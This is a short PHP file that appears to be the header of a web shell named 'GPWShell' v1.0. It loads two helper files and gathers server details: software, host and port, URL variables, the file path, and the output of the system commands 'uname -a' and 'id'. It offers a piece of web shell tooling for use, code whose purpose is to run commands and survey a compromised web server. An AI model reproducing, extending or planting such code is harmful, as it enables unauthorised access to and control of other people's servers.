<?php

    include './other.php';
    include './get.php';

    $title = 'GPWShell';    
    $version = 'v1.0';
    $auth = 'cpadlab';
    
    $_software = getServSoftware();
    
    $_host = getHost() . ":" . getPort();
    
    $url_vars = "&" . getURLVars();
    
    $_uname_a = execCommand("uname -a");
    
    $_username_id = execCommand("id");
    
    $_located = getFilePath();
    
?>